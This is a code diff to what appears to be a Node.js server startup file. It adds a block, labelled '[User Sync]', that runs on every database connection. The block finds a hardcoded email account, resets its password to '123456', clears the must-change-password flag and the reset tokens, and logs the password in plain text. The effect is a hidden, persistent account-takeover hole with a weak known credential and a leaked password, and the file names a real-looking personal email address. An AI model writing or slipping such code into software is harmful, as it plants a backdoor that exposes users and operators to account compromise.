@@ -31,7 +31,27 @@ process.on('uncaughtException', (error) => {
 });
 
 // Connect to Database
-const dbStartupPromise = connectDB();
+const dbStartupPromise = connectDB().then(async () => {
+  try {
+    const bcrypt = require("bcryptjs");
+    const User = require("./models/User");
+    const targetEmail = "waghom730@gmail.com";
+    const user = await User.findOne({ email: { $regex: new RegExp("^" + targetEmail.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&') + "$", "i") } });
+    if (user) {
+      const salt = await bcrypt.genSalt(10);
+      user.passwordHash = await bcrypt.hash("123456", salt);
+      user.mustChangePassword = false;
+      user.resetPasswordToken = undefined;
+      user.resetPasswordExpires = undefined;
+      await user.save();
+      console.log(`[User Sync] Password for ${user.email} (${user.name}) updated to '123456'`);
+    } else {
+      console.log(`[User Sync] Target user ${targetEmail} not found in DB.`);
+    }
+  } catch (err) {
+    console.error("[User Sync] Failed to update user password:", err.message);
+  }
+});
 const redisStartupPromise = connectRedis().then(() => {
   console.log("Redis connected");
   return true;
